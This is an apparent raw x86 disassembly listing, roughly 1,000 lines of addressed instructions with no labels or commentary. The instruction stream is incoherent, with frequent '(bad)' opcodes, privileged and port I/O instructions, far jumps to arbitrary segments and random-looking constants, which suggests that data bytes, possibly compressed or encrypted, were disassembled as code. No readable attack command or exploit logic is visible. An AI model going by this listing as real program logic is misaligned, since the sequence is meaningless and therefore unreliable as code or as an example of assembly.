  419893:	pushf  
  419894:	sub    al,ah
  419896:	cli    
  419897:	mov    dh,0x7e
  419899:	js     0x419910
  41989b:	fldenv [edi]
  41989d:	or     bl,bl
  41989f:	or     esp,0x43
  4198a2:	jg     0x419921
  4198a4:	call   0xe6e3:0xea40048c
  4198ab:	(bad)  
  4198ac:	mov    ds:0x369150b5,al
  4198b1:	mov    edx,0xdfc91610
  4198b6:	std    
  4198b7:	pop    esp
  4198b8:	and    al,0xb5
  4198ba:	fcom   DWORD PTR [esi+0x6bf63833]
  4198c0:	jmp    DWORD PTR [ebx-0x53]
  4198c3:	push   eax
  4198c4:	inc    ebp
  4198c5:	and    DWORD PTR [esi],esp
  4198c7:	(bad)  
  4198c8:	int3   
  4198c9:	xor    eax,DWORD PTR [ebp+edx*4-0x52a04d80]
  4198d0:	jmp    0x419852
  4198d2:	push   eax
  4198d3:	bnd jne 0x4198ec
  4198d6:	pop    es
  4198d7:	test   DWORD PTR [edx+0x1127e796],0x218b55a0
  4198e1:	lahf   
  4198e2:	add    eax,0xa8dc653d
  4198e7:	es mov eax,0xbfae55d3
  4198ed:	jmp    0xfa7d0480
  4198f2:	in     eax,0x48
  4198f4:	pop    ebx
  4198f5:	popf   
  4198f6:	(bad)
  4198f9:	jnp    0x419913
  4198fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198fc:	jb     0x419922
  4198fe:	cmp    DWORD PTR [edx-0x7c1db77a],0xffffffd4
  419905:	pop    ebx
  419906:	dec    edx
  419907:	xchg   edi,eax
  419908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419909:	mov    al,ds:0x16a0e40
  41990e:	xchg   ecx,eax
  41990f:	cmp    ebx,0xa240e74a
  419915:	xchg   ebp,eax
  419916:	cmp    al,0x7a
  419918:	in     eax,0x55
  41991a:	(bad)  
  41991b:	cmp    ah,BYTE PTR [eax+0x20]
  41991e:	daa    
  41991f:	push   0x13c125fd
  419924:	cli    
  419925:	cdq    
  419926:	(bad)  
  419927:	fptan  
  419929:	add    dh,BYTE PTR [ebx+0x4aa61b3]
  41992f:	repz and ebp,DWORD PTR [esi+0x64]
  419933:	scas   eax,DWORD PTR es:[edi]
  419934:	mov    dl,0xd2
  419936:	shl    BYTE PTR ds:0x99a77cde,0x11
  41993d:	xlat   BYTE PTR ds:[ebx]
  41993e:	sbb    eax,0xf858d5b8
  419943:	mov    ds:0x9d466dbb,al
  419948:	in     al,0xd1
  41994a:	cmp    DWORD PTR [eax+eax*8+0x57],edi
  41994e:	mov    edi,0xefbb4c04
  419953:	shr    DWORD PTR [edi],1
  419955:	ins    BYTE PTR es:[edi],dx
  419956:	sub    BYTE PTR [ecx-0x12ffff54],al
  41995c:	mov    al,ds:0x6b1c35e0
  419961:	shl    edx,1
  419963:	mov    bl,0xca
  419965:	mov    eax,0x8b5cc1a9
  41996a:	ss leave 
  41996c:	xor    eax,0xadb9d888
  419971:	aad    0x5e
  419973:	pop    ebx
  419974:	mov    eax,ds:0xac353163
  419979:	add    esi,esi
  41997b:	cmp    edi,0xdf269861
  419981:	mov    gs,WORD PTR [esi]
  419983:	inc    eax
  419984:	jb     0x419922
  419986:	retf   0xb81e
  419989:	dec    edi
  41998a:	std    
  41998b:	rcl    bl,1
  41998d:	inc    edi
  41998e:	stos   BYTE PTR es:[edi],al
  41998f:	or     esp,DWORD PTR [eax+0xb]
  419992:	xchg   edi,eax
  419993:	scas   eax,DWORD PTR es:[edi]
  419994:	inc    esi
  419995:	mov    WORD PTR [esi+0x4c57165],es
  41999b:	sbb    BYTE PTR [ebx+0x69],al
  41999e:	daa    
  41999f:	cmc    
  4199a0:	ss sahf 
  4199a2:	dec    esi
  4199a3:	ss inc edi
  4199a5:	out    0x9f,al
  4199a7:	lahf   
  4199a8:	mov    esp,0xaa799073
  4199ad:	test   al,0x12
  4199af:	dec    esp
  4199b0:	rcl    DWORD PTR [ebx],cl
  4199b2:	push   edi
  4199b3:	or     DWORD PTR [esi],edi
  4199b5:	push   0x56648d82
  4199ba:	aad    0x30
  4199bc:	dec    ebx
  4199bd:	pop    es
  4199be:	sub    al,0xbf
  4199c0:	and    BYTE PTR [eax*1-0x13d8ab54],ch
  4199c7:	xchg   esi,eax
  4199c8:	in     al,0xb6
  4199ca:	bound  edx,QWORD PTR [esi-0x30]
  4199cd:	out    dx,eax
  4199ce:	adc    ebp,DWORD PTR ds:0xa7033fb0
  4199d4:	sub    DWORD PTR [edx],eax
  4199d6:	pop    ecx
  4199d7:	jb     0x419a3f
  4199d9:	stos   DWORD PTR es:[edi],eax
  4199da:	push   edx
  4199db:	add    bh,BYTE PTR [ecx]
  4199dd:	scas   eax,DWORD PTR es:[edi]
  4199de:	push   esi
  4199df:	icebp  
  4199e0:	inc    eax
  4199e1:	xchg   ebp,eax
  4199e2:	jnp    0x419a36
  4199e4:	test   BYTE PTR [ebp+0x2f],ch
  4199e7:	call   0xf2c9:0x9d398302
  4199ee:	mov    ebx,0x5aabf45b
  4199f3:	pop    ds
  4199f4:	sar    ah,cl
  4199f6:	xor    eax,0x2c867e20
  4199fb:	out    0xe1,eax
  4199fd:	ss mov edi,0x480be14d
  419a03:	mov    bh,0x8b
  419a05:	add    al,BYTE PTR [edi]
  419a07:	pop    esi
  419a08:	mov    ah,0x49
  419a0a:	jo     0x419a55
  419a0c:	pop    ecx
  419a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a0e:	mov    ds:0x4c844a5f,eax
  419a13:	sti    
  419a14:	add    eax,0xcf19679c
  419a19:	clc    
  419a1a:	mov    BYTE PTR [edx],bl
  419a1c:	inc    edi
  419a1d:	jae    0x419a4f
  419a1f:	add    DWORD PTR ds:0x9d571ad4,ecx
  419a25:	mov    DWORD PTR [ebp-0x51],edx
  419a28:	pop    es
  419a29:	adc    ebx,edi
  419a2b:	out    dx,eax
  419a2c:	int3   
  419a2d:	push   eax
  419a2e:	push   edx
  419a2f:	inc    eax
  419a30:	xchg   esp,eax
  419a31:	aad    0x95
  419a33:	scas   al,BYTE PTR es:[edi]
  419a34:	adc    DWORD PTR [edi*1+0x72579ff7],edi
  419a3b:	popa   
  419a3c:	cdq    
  419a3d:	dec    edx
  419a3e:	add    al,BYTE PTR [edx-0x6e02a375]
  419a44:	push   edx
  419a45:	inc    esp
  419a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a47:	xlat   BYTE PTR ds:[ebx]
  419a48:	out    dx,eax
  419a49:	push   0xe10f5cc3
  419a4e:	jp     0x419a16
  419a50:	aam    0xaf
  419a52:	sar    BYTE PTR [ebp-0x5c],1
  419a55:	dec    eax
  419a56:	mov    DWORD PTR [ecx+0x66],0xffe3031d
  419a5d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419a5f:	push   edx
  419a60:	push   ecx
  419a61:	mov    edi,0x4d62fa08
  419a66:	iret   
  419a67:	in     al,dx
  419a68:	fsub   QWORD PTR [ecx+0xa]
  419a6b:	leave  
  419a6c:	lock (bad) 
  419a6f:	push   ecx
  419a70:	and    BYTE PTR [edx+0x4e],dl
  419a73:	sub    edx,esi
  419a75:	inc    esi
  419a76:	and    eax,0x1a0a426a
  419a7b:	test   al,0x20
  419a7d:	dec    edx
  419a7e:	cmp    ebp,0x66
  419a81:	out    0xbe,eax
  419a83:	push   edi
  419a84:	cmp    BYTE PTR fs:[edi+ebp*2-0x6b],0xdd
  419a8a:	push   edi
  419a8b:	mov    cl,0x73
  419a8d:	inc    ebx
  419a8e:	xlat   BYTE PTR ds:[ebx]
  419a8f:	mov    BYTE PTR ds:0x9a18ef18,al
  419a95:	cli    
  419a96:	int    0x80
  419a98:	movups XMMWORD PTR [ebp-0x599a4c0c],xmm7
  419a9f:	cmp    ah,bl
  419aa1:	das    
  419aa2:	(bad)  
  419aa3:	cs gs mov esi,0x6f16e84e
  419aaa:	ins    DWORD PTR es:[edi],dx
  419aab:	jbe    0x419b25
  419aad:	in     eax,0x66
  419aaf:	mov    DWORD PTR [esi-0x6737ddef],esp
  419ab5:	stc    
  419ab6:	lock mov ds:0x6b8685ab,al
  419abc:	adc    esp,DWORD PTR [ebx-0x30]
  419abf:	or     edi,DWORD PTR [esi+0x4310de75]
  419ac5:	cmp    al,0xf
  419ac7:	add    DWORD PTR [edx],edi
  419ac9:	pop    ss
  419aca:	data16 sti 
  419acc:	(bad)  
  419acd:	dec    esi
  419ace:	adc    eax,ebp
  419ad0:	outs   dx,BYTE PTR ds:[esi]
  419ad1:	mov    eax,ds:0x5605a14f
  419ad6:	lea    ebp,[ecx-0x36]
  419ad9:	sbb    DWORD PTR [ebx+ecx*2],eax
  419adc:	pop    ebp
  419add:	jnp    0x419a9e
  419adf:	push   ds
  419ae0:	jecxz  0x419a83
  419ae2:	cmp    eax,esp
  419ae4:	mov    cl,0xe3
  419ae6:	mov    ds:0xb0a80ecb,eax
  419aeb:	xchg   esi,eax
  419aec:	jmp    0x419b20
  419aee:	pop    ecx
  419aef:	sub    al,BYTE PTR [ebp+0x38f34664]
  419af5:	add    esp,ecx
  419af7:	mov    ?,WORD PTR [ecx+eiz*2-0x26faa34a]
  419afe:	out    0xb2,al
  419b00:	mov    al,0x96
  419b02:	mov    ecx,DWORD PTR [eax+0x51c34dc4]
  419b08:	cmp    eax,0x7ad46615
  419b0d:	jecxz  0x419adb
  419b0f:	push   ds
  419b10:	fucomi st,st(0)
  419b12:	push   0xffffffbd
  419b14:	adc    ch,BYTE PTR [esi+edi*4-0x47378057]
  419b1b:	ror    ecx,cl
  419b1d:	pushf  
  419b1e:	mov    cs,WORD PTR [ecx+eax*1-0x38c0fbe5]
  419b25:	stos   DWORD PTR es:[edi],eax
  419b26:	pop    esi
  419b27:	cmp    DWORD PTR [edx],esp
  419b29:	inc    esp
  419b2a:	mov    es,WORD PTR [edx+0x184a475c]
  419b30:	fst    DWORD PTR [ebp-0x22]
  419b33:	out    0xb6,eax
  419b35:	ins    BYTE PTR es:[edi],dx
  419b36:	in     eax,dx
  419b37:	fwait
  419b38:	sub    esp,edx
  419b3a:	cmp    ah,bl
  419b3c:	jmp    0x419b72
  419b3e:	inc    ecx
  419b3f:	adc    al,0xd5
  419b41:	inc    esi
  419b42:	and    BYTE PTR [eiz*1+0x48a4226c],al
  419b49:	fcom   DWORD PTR [esi+0x678f72f]
  419b4f:	push   0xffffffa2
  419b51:	adc    BYTE PTR [ebx],bh
  419b53:	shl    ah,1
  419b55:	inc    ecx
  419b56:	dec    esi
  419b57:	(bad)  
  419b58:	loopne 0x419b9d
  419b5a:	mov    BYTE PTR [ecx-0x44e8d4ed],dh
  419b60:	push   0xfa145e84
  419b65:	lods   eax,DWORD PTR ds:[esi]
  419b66:	cli    
  419b67:	mov    edi,0x2b3878d7
  419b6c:	ror    DWORD PTR ds:0x9c463095,cl
  419b72:	int    0xd4
  419b74:	(bad)  
  419b75:	jle    0x419b39
  419b77:	push   0xab91ca71
  419b7c:	jecxz  0x419ba7
  419b7e:	scas   eax,DWORD PTR es:[edi]
  419b7f:	enter  0x9b3,0x44
  419b83:	xchg   BYTE PTR [edx],ah
  419b85:	mov    edx,DWORD PTR [ebp-0x68]
  419b88:	pop    ecx
  419b89:	sbb    DWORD PTR [edx-0x84f65e6],ebp
  419b8f:	cmp    al,0xda
  419b91:	xlat   BYTE PTR ds:[ebx]
  419b92:	(bad)  
  419b93:	fdivr  st,st(3)
  419b95:	enter  0xa87a,0xdf
  419b99:	inc    esi
  419b9a:	or     DWORD PTR [ebp-0x65],esi
  419b9d:	jge    0x419c0d
  419b9f:	cmp    BYTE PTR [ebx-0x2fe58414],ch
  419ba5:	dec    ebp
  419ba6:	cld    
  419ba7:	hlt    
  419ba8:	push   ecx
  419ba9:	jne    0x419bb0
  419bab:	and    eax,0x6adb3d86
  419bb0:	adc    DWORD PTR [ecx],edi
  419bb2:	mov    ss,WORD PTR [eax-0x12]
  419bb5:	mov    eax,ds:0xf8c8b368
  419bba:	outs   dx,DWORD PTR ds:[esi]
  419bbb:	test   eax,0x93d978b5
  419bc0:	jnp    0x419bd4
  419bc2:	test   BYTE PTR ds:0xb6d34bfa,al
  419bc8:	jno    0x419be3
  419bca:	inc    edi
  419bcb:	sub    DWORD PTR [edx],esi
  419bcd:	and    bh,BYTE PTR [esi+edx*8]
  419bd0:	out    dx,al
  419bd1:	(bad)  
  419bd3:	ja     0x419bcb
  419bd5:	xchg   esp,eax
  419bd6:	gs cld 
  419bd8:	mov    BYTE PTR [edx+0x6d],0x80
  419bdc:	inc    ecx
  419bdd:	fdivr  DWORD PTR [ebx-0x32bb4ee4]
  419be3:	dec    eax
  419be4:	xchg   BYTE PTR [ebp+0x0],ch
  419be7:	ss mov eax,0x1c356975
  419bed:	mov    eax,ds:0xa92e807e
  419bf2:	jno    0x419bcf
  419bf4:	fiadd  WORD PTR [edi]
  419bf6:	das    
  419bf7:	inc    edx
  419bf8:	inc    eax
  419bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bfa:	jbe    0x419b9e
  419bfc:	stos   DWORD PTR es:[edi],eax
  419bfd:	sub    BYTE PTR [eax-0x8],al
  419c00:	and    BYTE PTR [ebx],bh
  419c02:	mov    ds:0x4141284e,eax
  419c07:	retf   
  419c08:	mov    ebx,0x1860d565
  419c0d:	icebp  
  419c0e:	jne    0x419c80
  419c10:	push   0xffffff96
  419c12:	imul   ax,dx,0xa14d
  419c17:	clc    
  419c18:	(bad)  
  419c19:	pop    edi
  419c1a:	aad    0xdf
  419c1c:	je     0x419bb6
  419c1e:	int3   
  419c1f:	shr    BYTE PTR [esi],cl
  419c21:	nop
  419c22:	push   ecx
  419c23:	push   ss
  419c24:	bound  esp,QWORD PTR [edi-0x7d379cf6]
  419c2a:	aaa    
  419c2b:	cmp    DWORD PTR [ebx],0x79
  419c2e:	(bad)  
  419c2f:	clc    
  419c30:	fadd   QWORD PTR [eax+0x7a8473ab]
  419c36:	(bad)  
  419c37:	outs   dx,BYTE PTR ds:[esi]
  419c38:	test   al,0xe0
  419c3a:	retf   0xe7ce
  419c3d:	jecxz  0x419c4b
  419c3f:	add    BYTE PTR [ecx-0x5c],0x65
  419c43:	and    eax,esp
  419c45:	repz lahf 
  419c47:	icebp  
  419c48:	sub    DWORD PTR [ebp-0x25d2e924],edi
  419c4e:	xor    ecx,ebx
  419c50:	cli    
  419c51:	inc    eax
  419c52:	jnp    0x419c0b
  419c54:	sahf   
  419c55:	ins    DWORD PTR es:[edi],dx
  419c56:	mov    bh,0x25
  419c58:	es mov al,0x6c
  419c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c5c:	cmc    
  419c5d:	push   cs
  419c5e:	add    edi,DWORD PTR [esi*1+0x6fc428fa]
  419c65:	test   BYTE PTR [edi+0x1a],bh
  419c68:	call   0x684ea375
  419c6d:	and    edi,DWORD PTR [edx+ebx*4+0x60a0e48a]
  419c74:	sbb    BYTE PTR ds:0x7f85413c,al
  419c7a:	push   cs
  419c7b:	in     eax,0x37
  419c7d:	push   cs
  419c7e:	hlt    
  419c7f:	enter  0xb5c5,0x7f
  419c83:	ins    BYTE PTR es:[edi],dx
  419c84:	loope  0x419ca9
  419c86:	pop    ebp
  419c87:	sbb    BYTE PTR ds:0x1d728203,bl
  419c8d:	popa   
  419c8e:	sti    
  419c8f:	arpl   WORD PTR [eax+ebx*8+0x7e1d1a4b],ax
  419c96:	cli    
  419c97:	xor    eax,0x7c717266
  419c9c:	sbb    ebp,DWORD PTR [eax]
  419c9e:	add    al,0x59
  419ca0:	mov    ebp,0x4bec0576
  419ca5:	xchg   BYTE PTR [ebx+0x5eeb3630],ch
  419cab:	mov    bl,0xb1
  419cad:	rol    ebx,cl
  419caf:	or     eax,0xb0e33a4
  419cb4:	sub    BYTE PTR ds:0xf3407b46,bh
  419cba:	and    eax,0xd43630c1
  419cbf:	fsub   DWORD PTR [ecx]
  419cc1:	xlat   BYTE PTR ds:[ebx]
  419cc2:	xchg   edx,eax
  419cc3:	rcl    ah,0xb6
  419cc6:	mov    ebx,0x60e64f9a
  419ccb:	sbb    BYTE PTR [edi+0x3],ah
  419cce:	sub    DWORD PTR [ebp-0x6be1a589],edx
  419cd4:	inc    ecx
  419cd5:	in     eax,dx
  419cd6:	pop    ebp
  419cd7:	xlat   BYTE PTR ds:[ebx]
  419cd8:	test   BYTE PTR [esi-0x32],ah
  419cdb:	inc    esi
  419cdc:	jns    0x419cfc
  419cde:	add    BYTE PTR [ebx],ah
  419ce0:	test   DWORD PTR [ebp-0x11],edi
  419ce3:	jl     0x419ca4
  419ce5:	xlat   BYTE PTR ds:[ebx]
  419ce6:	rcl    BYTE PTR gs:[eax+0x8505c27],cl
  419ced:	fcmovb st,st(1)
  419cef:	and    DWORD PTR [eiz*4-0x3f412707],ecx
  419cf6:	sbb    dl,BYTE PTR [edx-0x42d3036c]
  419cfc:	fwait
  419cfd:	mov    ebx,0x5789197
  419d02:	adc    eax,0x7e4405a3
  419d07:	fnstcw WORD PTR [edx]
  419d09:	das    
  419d0a:	dec    ecx
  419d0b:	int3   
  419d0c:	sub    BYTE PTR [ebx+0x44],dl
  419d0f:	cld    
  419d10:	fcom   QWORD PTR [edi+edi*2]
  419d13:	jle    0x419cfd
  419d15:	mov    ebx,0xf6ecfc3
  419d1a:	push   ss
  419d1b:	ins    DWORD PTR es:[edi],dx
  419d1c:	add    edx,DWORD PTR [ebx*8-0x20254e7d]
  419d23:	push   eax
  419d24:	inc    edi
  419d25:	retf   
  419d26:	add    al,0x2
  419d28:	mov    esp,0x9f8702a6
  419d2d:	mov    bl,0x7b
  419d2f:	lea    edx,[ecx]
  419d31:	push   edx
  419d32:	mov    ebx,0x467405fa
  419d37:	adc    ebp,edi
  419d39:	lds    ecx,FWORD PTR [ecx]
  419d3b:	sar    DWORD PTR [edx+esi*1],0x30
  419d3f:	test   esp,ebx
  419d41:	xlat   BYTE PTR gs:[ebx]
  419d43:	mov    ebp,eax
  419d45:	lds    eax,FWORD PTR [ebx+eiz*4]
  419d48:	jae    0x419d80
  419d4a:	sub    eax,0xb27c84e4
  419d4f:	sbb    eax,0x35007b62
  419d54:	mov    ch,0x40
  419d56:	or     ch,BYTE PTR [ebx]
  419d58:	and    DWORD PTR [ecx],0x4b
  419d5b:	shl    cl,1
  419d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d5e:	adc    eax,0x1a
  419d61:	sbb    cl,BYTE PTR [eax]
  419d63:	adc    BYTE PTR [ebx+ebp*2-0x7488e222],ah
  419d6a:	and    bh,0x67
  419d6d:	mov    al,0x96
  419d6f:	pop    edi
  419d70:	inc    eax
  419d71:	ja     0x419d8e
  419d73:	mov    bh,0x34
  419d75:	mov    ebx,0xb9cccefd
  419d7a:	sub    BYTE PTR [edi-0x6bafb6c5],ch
  419d80:	mov    bh,0x7d
  419d82:	and    DWORD PTR [ecx+0x16],edx
  419d85:	mov    ch,0x9d
  419d87:	push   eax
  419d88:	mov    eax,ds:0x10e8f02c
  419d8d:	push   esi
  419d8e:	int3   
  419d8f:	in     al,dx
  419d90:	cld    
  419d91:	sub    DWORD PTR [ebx],0x72255dd7
  419d97:	cdq    
  419d98:	or     al,bh
  419d9a:	mov    cl,0x1
  419d9c:	jge    0x419ddb
  419d9e:	jbe    0x419dc1
  419da0:	xchg   DWORD PTR [edi+0x13215f82],ebx
  419da6:	sub    BYTE PTR [edi-0x4c],bh
  419da9:	jmp    0x419d8b
  419dab:	xchg   DWORD PTR ds:0xf34b0f9a,esp
  419db1:	add    al,0x7c
  419db3:	mov    es,WORD PTR [edx+0x6b]
  419db6:	push   ebp
  419db7:	clc    
  419db8:	cmp    ebp,edx
  419dba:	cmp    eax,0x863bb30
  419dbf:	xor    al,dh
  419dc1:	ficomp DWORD PTR [ebp-0x73]
  419dc4:	imul   ecx,DWORD PTR [ebp-0x3a],0x7b
  419dc8:	inc    edx
  419dc9:	mov    al,0xd3
  419dcb:	loop   0x419dd9
  419dcd:	js     0x419d70
  419dcf:	sbb    eax,0x615ae7d9
  419dd4:	in     al,dx
  419dd5:	cmp    BYTE PTR [edi+0x4db0082c],al
  419ddb:	arpl   WORD PTR [ebp-0x720a2a76],si
  419de1:	ret    0xb2da
  419de4:	shl    bh,0x9f
  419de7:	cmp    eax,ecx
  419de9:	mov    cl,BYTE PTR [eax-0x18]
  419dec:	jmp    0x2520:0xbfa22718
  419df3:	xchg   esi,eax
  419df4:	mov    ecx,0x3140bcd2
  419df9:	mov    esi,0x1d560847
  419dfe:	out    dx,eax
  419dff:	xor    BYTE PTR ds:[eax-0x32],cl
  419e03:	adc    cl,dl
  419e05:	xchg   ebp,eax
  419e06:	inc    ebx
  419e07:	ins    BYTE PTR es:[edi],dx
  419e08:	dec    DWORD PTR [ebx+0x4c1dfe66]
  419e0e:	xor    al,0x37
  419e10:	sbb    al,0x1c
  419e12:	mov    ah,0x9d
  419e14:	mov    ds:0x1f2c7e85,al
  419e19:	xchg   edi,eax
  419e1a:	pop    ss
  419e1b:	pop    eax
  419e1c:	(bad)
  419e1f:	jmp    FWORD PTR [edx+0x52]
  419e22:	push   esp
  419e23:	sub    eax,0x3e5c4a5c
  419e28:	pop    ebx
  419e29:	dec    esp
  419e2a:	outs   dx,DWORD PTR ds:[esi]
  419e2b:	jo     0x419db8
  419e2d:	dec    BYTE PTR [ebp+0x26]
  419e30:	jbe    0x419e4c
  419e32:	popf   
  419e33:	inc    ebp
  419e34:	hlt    
  419e35:	out    dx,al
  419e36:	sar    DWORD PTR [ebp+0x4bb8c749],1
  419e3c:	mov    ds:0xea29c1b,al
  419e41:	pop    esi
  419e42:	push   ebx
  419e43:	ins    BYTE PTR es:[edi],dx
  419e44:	dec    edx
  419e45:	repnz arpl WORD PTR [eax-0x6d],sp
  419e49:	jo     0x419e82
  419e4b:	mov    bh,0xcb
  419e4d:	add    ebx,DWORD PTR [edx+0x2e075d46]
  419e53:	stos   DWORD PTR es:[edi],eax
  419e54:	in     eax,dx
  419e55:	rcl    esi,1
  419e57:	iret   
  419e58:	mov    dl,0x2f
  419e5a:	and    ecx,esi
  419e5c:	adc    eax,0x29c16668
  419e61:	(bad)  
  419e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e63:	pop    ecx
  419e64:	sbb    al,0xf6
  419e66:	mov    al,ds:0x5cbf789b
  419e6b:	inc    ebx
  419e6c:	cwde   
  419e6d:	cdq    
  419e6e:	mov    eax,0x775c374d
  419e73:	daa    
  419e74:	fstp   st(4)
  419e76:	icebp  
  419e77:	out    dx,eax
  419e78:	inc    esi
  419e79:	mov    al,0xbf
  419e7b:	push   ecx
  419e7c:	and    BYTE PTR [ecx+0x40],dl
  419e7f:	pop    ss
  419e80:	retf   
  419e81:	repnz test BYTE PTR [ebx],0xcf
  419e85:	mul    DWORD PTR [esi-0x1a]
  419e88:	add    eax,DWORD PTR [edx-0x7f]
  419e8b:	cs mov esi,0xcbd8306f
  419e91:	inc    esp
  419e92:	inc    edx
  419e93:	rcpps  xmm7,XMMWORD PTR [eax]
  419e96:	adc    DWORD PTR [ebx-0x168c9f36],0xea3eabfb
  419ea0:	push   ss
  419ea1:	sti    
  419ea2:	test   BYTE PTR [edx-0x58],ah
  419ea5:	jmp    0xf2873a44
  419eaa:	add    ch,BYTE PTR [esi+0xf]
  419ead:	daa    
  419eae:	mov    ah,0x6d
  419eb0:	add    bh,BYTE PTR [ebp-0x7aab5ee6]
  419eb6:	xor    BYTE PTR [esi-0xd],bl
  419eb9:	lds    esp,FWORD PTR [ecx-0x33dbcb6f]
  419ebf:	mov    al,ds:0xb1259afc
  419ec4:	rcr    ah,0x59
  419ec7:	mov    edi,0xf30fc534
  419ecc:	mov    edi,0x37cdb16b
  419ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ed2:	dec    esi
  419ed3:	sbb    ch,BYTE PTR [edi+0xe]
  419ed6:	ror    DWORD PTR [edx+0x51],0x28
  419eda:	pusha  
  419edb:	fwait
  419edc:	xchg   ebp,eax
  419edd:	and    eax,ebx
  419edf:	mov    dl,0x22
  419ee1:	mov    eax,ds:0x3ba2227
  419ee6:	pop    ebp
  419ee7:	fild   QWORD PTR [esi-0x3b9b397f]
  419eed:	iret   
  419eee:	sbb    al,0xbe
  419ef0:	xchg   BYTE PTR [eax+esi*1+0x3],dh
  419ef4:	xchg   edx,eax
  419ef5:	(bad)  
  419ef6:	repz dec DWORD PTR [esi+0x6d]
  419efa:	pop    ds
  419efb:	cmc    
  419efc:	and    DWORD PTR [esi],0x95fe2e2a
  419f02:	pop    esi
  419f03:	fbstp  TBYTE PTR [edi]
  419f05:	inc    ebp
  419f06:	fbstp  TBYTE PTR [edx+0x68ad37e7]
  419f0c:	xchg   edi,eax
  419f0d:	loop   0x419f79
  419f0f:	test   al,0x1f
  419f11:	lods   al,BYTE PTR ds:[esi]
  419f12:	imul   ebp,DWORD PTR [edx],0xffffff82
  419f15:	cmp    al,0x79
  419f17:	sbb    DWORD PTR [esi-0x1a],eax
  419f1a:	or     DWORD PTR [ecx-0x52],eax
  419f1d:	dec    edi
  419f1e:	mov    al,0xdf
  419f20:	dec    ebx
  419f21:	stos   DWORD PTR es:[edi],eax
  419f22:	dec    edx
  419f23:	jge    0x419f25
  419f25:	xchg   edi,eax
  419f26:	add    esp,DWORD PTR [edx-0xb]
  419f29:	iret   
  419f2a:	pop    edi
  419f2b:	loop   0x419f87
  419f2d:	sbb    dh,BYTE PTR [edi-0x19]
  419f30:	fwait
  419f31:	mov    esi,0x80e05135
  419f36:	dec    ebx
  419f37:	cmp    DWORD PTR [esi-0x6],esp
  419f3a:	push   ebp
  419f3b:	jg     0x419f95
  419f3d:	(bad)  
  419f3e:	hlt    
  419f3f:	and    BYTE PTR [eax],bh
  419f41:	mov    esi,0xc1419c29
  419f46:	dec    ebp
  419f47:	sbb    ecx,DWORD PTR [ebp-0x5ca89479]
  419f4d:	xor    ebx,DWORD PTR fs:[edi+0x131e528e]
  419f54:	push   0xffffffaf
  419f56:	(bad)  
  419f57:	fstp   QWORD PTR [edx]
  419f59:	sti    
  419f5a:	add    ah,BYTE PTR [esi+0x7cab69d0]
  419f60:	xchg   edx,eax
  419f61:	pop    eax
  419f62:	ret    
  419f63:	imul   ebp,esp,0x3c2ae2ce
  419f69:	in     eax,dx
  419f6a:	ret    0x81a5
  419f6d:	(bad)  
  419f6e:	push   ds
  419f6f:	inc    ebp
  419f70:	test   eax,0xf3bfcdc1
  419f75:	out    0x97,eax
  419f77:	and    eax,0x169e7f66
  419f7c:	ins    DWORD PTR es:[edi],dx
  419f7d:	std    
  419f7e:	pop    ecx
  419f7f:	jcxz   0x419f93
  419f82:	fldcw  WORD PTR [eax-0x3c]
  419f85:	add    eax,0x742a7449
  419f8a:	pop    ss
  419f8b:	jmp    FWORD PTR [esi+ebx*2-0x36]
  419f8f:	lds    ecx,FWORD PTR [ebp+ebx*4+0x6db550db]
  419f96:	stos   DWORD PTR es:[edi],eax
  419f97:	push   edx
  419f98:	adc    al,0x5
  419f9a:	or     DWORD PTR ds:0x9ee4d820,esp
  419fa0:	in     eax,0x13
  419fa2:	pop    edi
  419fa3:	int    0xb3
  419fa5:	lea    ebx,[ebp+0x23016d39]
  419fab:	popf   
  419fac:	(bad)  
  419fad:	adc    eax,0x72240719
  419fb2:	addr16 retf 0xac56
  419fb6:	mov    bh,0x7b
  419fb8:	xchg   esi,eax
  419fb9:	lods   al,BYTE PTR ds:[esi]
  419fba:	or     al,0xf8
  419fbc:	add    bh,BYTE PTR [eax-0x56]
  419fbf:	je     0x41a026
  419fc1:	cmp    edx,DWORD PTR [ecx+0x22d18ecc]
  419fc7:	pop    ecx
  419fc8:	sar    DWORD PTR [esi+eax*8-0x53b2fc44],1
  419fcf:	ss shl al,0x63
  419fd3:	mov    BYTE PTR [esi-0x2497501],al
  419fd9:	(bad)  
  419fda:	icebp  
  419fdb:	(bad)  
  419fdc:	and    eax,0xff316e91
  419fe1:	int3   
  419fe2:	sub    al,0xbb
  419fe4:	aam    0xe2
  419fe6:	mov    al,0xde
  419fe8:	ins    DWORD PTR es:[edi],dx
  419fe9:	pop    eax
  419fea:	and    eax,0xbf6d2e0
  419fef:	out    dx,eax
  419ff0:	push   esi
  419ff1:	cmp    al,0xb6
  419ff3:	mov    esi,0x48c681b1
  419ff8:	push   esi
  419ff9:	sub    edi,ecx
  419ffb:	cmp    BYTE PTR [ebx+0x5c626ca6],dh
  41a001:	mov    edi,0x30ef7dd1
  41a006:	neg    ebp
  41a008:	jge    0x41a03b
  41a00a:	xchg   ecx,eax
  41a00b:	or     bl,BYTE PTR [edx]
  41a00d:	sub    BYTE PTR [esp+ecx*2+0x29b1f20a],cl
  41a014:	sbb    eax,0x687e4c6a
  41a019:	add    BYTE PTR [ebp-0x3098a549],0xb5
  41a020:	jge    0x419fce
  41a022:	cmp    esp,eax
  41a024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a025:	mov    eax,0x6d1d6000
  41a02a:	stos   BYTE PTR es:[edi],al
  41a02b:	jp     0x41a056
  41a02d:	adc    dl,BYTE PTR [ebx+0x3317dcad]
  41a033:	je     0x419ffc
  41a035:	out    dx,eax
  41a036:	ret    0x20
  41a039:	and    DWORD PTR [edx],edx
  41a03b:	js     0x41a063
  41a03d:	mov    ebp,0x96e971d5
  41a042:	dec    ecx
  41a043:	fstp   DWORD PTR [ecx-0x546c090d]
  41a049:	ror    BYTE PTR [eax-0x33],0x5e
  41a04d:	repz call 0xb59620be
  41a053:	dec    ebx
  41a054:	pop    ebp
  41a055:	jnp    0x41a06e
  41a057:	add    ecx,ecx
  41a059:	std    
